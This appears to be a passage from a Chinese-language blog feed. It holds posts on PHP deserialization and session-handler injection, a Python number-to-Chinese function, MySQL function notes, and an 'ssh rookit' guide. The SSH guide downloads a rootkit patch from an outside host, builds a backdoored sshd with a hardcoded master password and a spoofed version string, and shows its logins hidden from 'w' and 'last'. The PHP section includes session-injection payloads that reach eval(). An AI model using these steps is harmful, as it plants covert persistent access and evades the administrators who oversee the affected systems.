&#123;</span><br><span class="line">        $this-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = &apos;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:6:&quot;hellob&quot;;&#125;&apos;;</span><br><span class="line">$e = &apos;O:5:&quot;test1&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;hello&quot;;s:1:&quot;b&quot;;N;&#125;&apos;;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($d));</span><br><span class="line">var_dump(unserialize($e));</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a has changed</span><br><span class="line">object(test)[2]</span><br><span class="line">  public &apos;a&apos; =&gt; string &apos;hia&apos; (length=3)</span><br><span class="line">  public &apos;b&apos; =&gt; string &apos;hellob&apos; (length=6)</span><br><span class="line">a has changed</span><br><span class="line">object(test1)[1]</span><br><span class="line">  public &apos;a&apos; =&gt; string &apos;hia&apos; (length=3)</span><br><span class="line">  public &apos;b&apos; =&gt; null</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    function __construct($var, $file1, $file2)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;var = $var;</span><br><span class="line">        $this-&gt;file1 = $file1;</span><br><span class="line">        $this-&gt;file2 = $file2;</span><br><span class="line">        echo $this-&gt;var . &apos; and &apos; . $this-&gt;file1 . &apos; and &apos; . $this-&gt;file2 . &apos;defined&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;file1);</span><br><span class="line">        echo $this-&gt;file1 . &apos;deleted&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return file_get_contents($this-&gt;file2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// $file = new File(&apos;hello&apos;,&apos;123.txt&apos;,&apos;456.php&apos;);</span><br><span class="line">// var_dump(serialize($file));</span><br><span class="line">echo unserialize(&apos;O:4:&quot;File&quot;:3:&#123;s:3:&quot;var&quot;;s:5:&quot;hello&quot;;s:5:&quot;file1&quot;;s:7:&quot;123.txt&quot;;s:5:&quot;file2&quot;;s:7:&quot;456.php&quot;;&#125;&apos;);</span><br></pre></td></tr></table></figure><ul><li>__construct() 在实例化一个对象时被调用，一般用来给属性赋值，</li><li>__destruct() 在实例化对象完成后执行，</li><li>__toString() 函数在echo一个对象时被调用</li></ul><p>将字符串反序列化后，由于已经对变量赋过值，那么就不会再执行construct()函数，在construct()中赋值的变量也是无效的。上述代码中destruct()方法在在反序列化后，实例化对象结束后执行了，tostring()函数在echo unserialize()处，也被执行了</p><h2 id="PHP-Session-序列化及反序列化处理器"><a href="#PHP-Session-序列化及反序列化处理器" class="headerlink" title="PHP Session 序列化及反序列化处理器"></a>PHP Session 序列化及反序列化处理器</h2><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize (php&gt;=5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><h3 id="配置选项-session-serialize-handler"><a href="#配置选项-session-serialize-handler" class="headerlink" title="配置选项 session.serialize_handler"></a>配置选项 session.serialize_handler</h3><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler &quot;php&quot;</span><br></pre></td></tr></table></figure><h3 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h3><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;ryat&apos;] = &apos;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&apos;;</span><br></pre></td></tr></table></figure></p><p>例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line">// var_dump($_SESSION);</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt;</span><br><span class="line">  object(stdClass)#1 (0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，通过注入 | 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）</p><h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><p>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:6:&quot;spoock&quot;</span><br></pre></td></tr></table></figure></p><p>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="首先访问test1-php"><a href="#首先访问test1-php" class="headerlink" title="首先访问test1.php"></a>首先访问test1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 这一步将设置session的值 |O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后’php_serialize’将会设置session对话并且值为a:1:{s:6:”spoock”;s:48:”|O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}”;}</p><h4 id="然后访问test2-php"><a href="#然后访问test2-php" class="headerlink" title="然后访问test2.php"></a>然后访问test2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这一步将会利用解析session对话的值，以|为分割符将session分割为键名和值两部分<br>键名：a:1:{s:6:”spoock”;s:48:”<br>值O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}”;}<br>从而解析出了序列化，自动生成了lemon的类，当类在结尾销毁时将会调用析构函数执行恶意代码</p><h4 id="session-upload-progress-enabled"><a href="#session-upload-progress-enabled" class="headerlink" title="session.upload_progress.enabled"></a>session.upload_progress.enabled</h4><p>而当这个选项被打开时，php会自动记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(unserialize(&apos;O:+4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&apos;));</span><br><span class="line">var_dump(unserialize(&apos;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python_num2han</title>
      <link href="/2017/10/14/python/python-num2han/"/>
      <url>/2017/10/14/python/python-num2han/</url>
      <content type="html"><![CDATA[<h2 id="python-数字转汉字函数"><a href="#python-数字转汉字函数" class="headerlink" title="python 数字转汉字函数"></a>python 数字转汉字函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num2han</span><span class="params">(num)</span>:</span></span><br><span class="line">    sep = (<span class="string">''</span>, <span class="string">u'十'</span>, <span class="string">u'百'</span>, <span class="string">u'千'</span>, <span class="string">u'万'</span>, <span class="string">u'十'</span>, <span class="string">u'百'</span>, <span class="string">u'千'</span>, <span class="string">u'亿'</span>, <span class="string">u'十'</span>, <span class="string">u'百'</span>, <span class="string">u'千'</span>, <span class="string">u'万'</span>, <span class="string">u'十'</span>, <span class="string">u'百'</span>, <span class="string">u'千'</span>)</span><br><span class="line">    han = (<span class="string">u'零'</span>, <span class="string">u'一'</span>, <span class="string">u'二'</span>, <span class="string">u'三'</span>, <span class="string">u'四'</span>, <span class="string">u'五'</span>, <span class="string">u'六'</span>, <span class="string">u'七'</span>, <span class="string">u'八'</span>, <span class="string">u'九'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([j + sep[i] <span class="keyword">for</span> i, j <span class="keyword">in</span> enumerate(han[int(i)] <span class="keyword">for</span> i <span class="keyword">in</span> str(num)[::<span class="number">-1</span>])][::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print num2han(123456789)</span><br><span class="line">一亿二千三百四十五万六千七百八十九</span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>ssh rookit</title>
      <link href="/2016/11/12/%E6%8F%90%E6%9D%83%E5%90%8E%E9%97%A8/ssh_rookit/"/>
      <url>/2016/11/12/%E6%8F%90%E6%9D%83%E5%90%8E%E9%97%A8/ssh_rookit/</url>
      <content type="html"><![CDATA[<h3 id="下载源码和后门"><a href="#下载源码和后门" class="headerlink" title="下载源码和后门"></a>下载源码和后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">wget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf openssh-5.9p1.tar.gz</span><br><span class="line">tar -zxvf     0x06-openssh-5.9p1.patch.tar.gz</span><br></pre></td></tr></table></figure><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br></pre></td></tr></table></figure><h3 id="vim-includes-h-修改密码SECRETPW"><a href="#vim-includes-h-修改密码SECRETPW" class="headerlink" title="vim includes.h 修改密码SECRETPW"></a>vim includes.h 修改密码SECRETPW</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define ILOG &quot;/tmp/ilog&quot;</span><br><span class="line">#define OLOG &quot;/tmp/olog&quot;</span><br><span class="line">#define SECRETPW &quot;alibaba&quot;</span><br></pre></td></tr></table></figure><h3 id="vi-inculdes-h-修改ssh版本（原来的）"><a href="#vi-inculdes-h-修改ssh版本（原来的）" class="headerlink" title="vi inculdes.h 修改ssh版本（原来的）"></a>vi inculdes.h 修改ssh版本（原来的）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define SSH_VERSION     &quot;OpenSSH_6.6.1p1, OpenSSL 1.0.1e-fips 11 Feb 2013&quot;</span><br><span class="line">#define SSH_PORTABLE    &quot;p1&quot;</span><br></pre></td></tr></table></figure><h3 id="编译准备"><a href="#编译准备" class="headerlink" title="编译准备"></a>编译准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openssl openssl-devel pam-devel</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="有时有权限问题"><a href="#有时有权限问题" class="headerlink" title="有时有权限问题"></a>有时有权限问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/ssh/*</span><br></pre></td></tr></table></figure><h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># centos7</span><br><span class="line">systemctl restart sshd.service</span><br><span class="line"></span><br><span class="line">### 旧版本</span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><h3 id="用设置的密码登陆"><a href="#用设置的密码登陆" class="headerlink" title="用设置的密码登陆"></a>用设置的密码登陆</h3><p>可以看到不显示登陆状态<br>last 也没有记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh 192.168.50.129</span><br><span class="line">root@192.168.50.129&apos;s password:</span><br><span class="line">Last failed login: Fri Nov 11 18:46:59 PST 2016 from 192.168.50.128 on ssh:notty</span><br><span class="line">There were 2 failed login attempts since the last successful login.</span><br><span class="line">Last login: Fri Nov 11 17:56:00 2016</span><br><span class="line">[root@bogon ~]# w</span><br><span class="line"> 18:50:09 up 1 min,  1 user,  load average: 1.16, 0.43, 0.15</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">[root@bogon ~]#</span><br></pre></td></tr></table></figure></p><p>但是会显示端口 ￥%&amp;*#%￥#……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@bogon ~]# netstat -tna</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 192.168.50.129:22       192.168.50.128:39240    ESTABLISHED</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN</span><br><span class="line">tcp6       0      0 ::1:631                 :::*                    LISTEN</span><br><span class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN</span><br><span class="line">[root@bogon ~]#</span><br></pre></td></tr></table></figure></p><h3 id="正常账号登陆显示已登陆"><a href="#正常账号登陆显示已登陆" class="headerlink" title="正常账号登陆显示已登陆"></a>正常账号登陆显示已登陆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh 192.168.50.129</span><br><span class="line">root@192.168.50.129&apos;s password:</span><br><span class="line">Last failed login: Fri Nov 11 18:46:59 PST 2016 from 192.168.50.128 on ssh:notty</span><br><span class="line">There were 2 failed login attempts since the last successful login.</span><br><span class="line">Last login: Fri Nov 11 17:56:00 2016</span><br><span class="line">[root@bogon ~]# w</span><br><span class="line"> 18:53:50 up 4 min,  2 users,  load average: 0.43, 0.29, 0.15</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/0    192.168.50.128   18:53    4.00s  0.04s  0.02s w</span><br><span class="line">[root@bogon ~]#</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> linux </category>
          
          <category> 后门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql函数简记</title>
      <link href="/2016/11/04/post/sql%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
      <url>/2016/11/04/post/sql%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="sql函数优先级"><a href="#sql函数优先级" class="headerlink" title="sql函数优先级"></a>sql函数优先级</h2><table><thead><tr><th>操作符</th><th>优先级</th></tr></thead><tbody><tr><td>:=</td><td>1</td></tr><tr><td>｜｜, OR, XOR</td><td>2</td></tr><tr><td>&amp;&amp;, AND</td><td>3</td></tr><tr><td>NOT</td><td>4</td></tr><tr><td>BETWEEN, CASE, WHEN, THEN, ELSE</td><td>5</td></tr><tr><td>=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN</td><td>6</td></tr><tr><td>\</td><td></td><td>7</td></tr><tr><td>&amp;</td><td>8</td></tr><tr><td>&lt;&lt;, &gt;&gt;</td><td>9</td></tr><tr><td>-, +</td><td>10</td></tr><tr><td>*, /, DIV, %, MOD</td><td>11</td></tr><tr><td>^</td><td>12</td></tr><tr><td>- (一元减号), ~ (一元比特反转)</td><td>12</td></tr><tr><td>!</td><td>13</td></tr><tr><td>BINARY, COLLATE</td><td>14</td></tr></tbody></table><p>注释：假如 HIGH_NOT_PRECEDENCE SQL 模式被激活，则 NOT 的优先级同 the ! 操作符相同。</p><h2 id="比较运算"><a href="#比较运算" class="headerlink" title="比较运算"></a>比较运算</h2><p>比较运算产生的结果为1(TRUE)、0 (FALSE)或 NULL。这些运算可用于数字和字符串。根据需要，字符串可自动转换为数字，而数字也可自动转换为字符串。</p><h2 id="控制流程函数"><a href="#控制流程函数" class="headerlink" title="控制流程函数"></a>控制流程函数</h2><p>CASE 1 WHEN 1 THEN 2<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  SELECT CASE 1 WHEN 1 THEN 'one' WHEN 2 THEN 'two' ELSE 'more' END;</span><br><span class="line">+<span class="comment">------------------------------------------------------------+</span></span><br><span class="line">| CASE 1 WHEN 1 THEN 'one' WHEN 2 THEN 'two' ELSE 'more' <span class="keyword">END</span> |</span><br><span class="line">+<span class="comment">------------------------------------------------------------+</span></span><br><span class="line">| one                                                        |</span><br><span class="line">+<span class="comment">------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  <span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="number">2</span> <span class="keyword">WHEN</span> <span class="number">1</span> <span class="keyword">THEN</span> <span class="string">'one'</span> <span class="keyword">WHEN</span> <span class="number">2</span> <span class="keyword">THEN</span> <span class="string">'two'</span> <span class="keyword">ELSE</span> <span class="string">'more'</span> <span class="keyword">END</span>;</span><br><span class="line">+<span class="comment">------------------------------------------------------------+</span></span><br><span class="line">| CASE 2 WHEN 1 THEN 'one' WHEN 2 THEN 'two' ELSE 'more' <span class="keyword">END</span> |</span><br><span class="line">+<span class="comment">------------------------------------------------------------+</span></span><br><span class="line">| two                                                        |</span><br><span class="line">+<span class="comment">------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p><hr><p>IF(expr1,expr2,expr3)<br>expr1 是TRUE,返回值为expr2; 否则返回expr3。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1,2,3);</span><br><span class="line">+-----------+</span><br><span class="line">| IF(1,2,3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         2 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT IF(0,2,3);</span><br><span class="line">+-----------+</span><br><span class="line">| IF(0,2,3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         3 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>IFNULL(expr1,expr2)<br>expr1 不为 NULL，返回 expr1; 否则返回 expr2。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IFNULL(2,3);</span><br><span class="line">+-------------+</span><br><span class="line">| IFNULL(1,2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           2 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT IFNULL(0,3);</span><br><span class="line">+-------------+</span><br><span class="line">| IFNULL(0,2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           3 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>NULLIF(expr1,expr2)<br>expr1 = expr2 ,返回NULL，否则返回 expr1。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT NULLIF(1,1);</span><br><span class="line">+-------------+</span><br><span class="line">| NULLIF(1,1) |</span><br><span class="line">+-------------+</span><br><span class="line">|        NULL |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line">mysql&gt; SELECT NULLIF(1,2);</span><br><span class="line">+-------------+</span><br><span class="line">| NULLIF(1,2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>ASCII(str)<br>返回值为字符串str 的最左字符的数值。<br>假如str为空字符串，则返回值为 0 。<br>假如str 为NULL，则返回值为 NULL。<br>ASCII()用于带有从 0到255的数值的字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ASCII(&quot;a&quot;);</span><br><span class="line">+------------+</span><br><span class="line">| ASCII(&quot;a&quot;) |</span><br><span class="line">+------------+</span><br><span class="line">|         97 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT ASCII(&quot;ab&quot;);</span><br><span class="line">+-------------+</span><br><span class="line">| ASCII(&quot;ab&quot;) |</span><br><span class="line">+-------------+</span><br><span class="line">|          97 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>ORD(str) 同上</p><hr><p>BIN(N)<br>返回值为N的二进制值的字符串表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT BIN(2);</span><br><span class="line">+--------+</span><br><span class="line">| BIN(2) |</span><br><span class="line">+--------+</span><br><span class="line">| 10     |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 